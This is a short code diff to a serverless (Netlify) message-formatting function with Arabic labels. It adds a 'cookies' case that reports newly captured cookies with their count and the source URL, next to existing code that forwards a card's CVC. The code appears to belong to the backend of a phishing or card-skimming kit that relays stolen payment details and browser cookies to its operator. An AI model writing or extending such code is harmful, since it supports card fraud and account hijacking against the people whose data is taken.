@@ -171,6 +171,16 @@ ${data.message.cvc ? `🔐 CVC: ${data.message.cvc}` : ''}
 📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
         break;
         
+      case 'cookies':
+        formattedMessage = `🍪 تم إضافة Cookies جديدة
+📝 الرسالة: ${data.message}
+🌐 الرابط: ${data.url || 'غير محدد'}
+🍪 عدد Cookies: ${data.cookies ? Object.keys(data.cookies).length : 0}
+⏰ الوقت: ${messageTimestamp}
+🌐 البيئة: Netlify Functions
+📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
+        break;
+        
       default:
         formattedMessage = `${data.message}
 ⏰ الوقت: ${messageTimestamp}
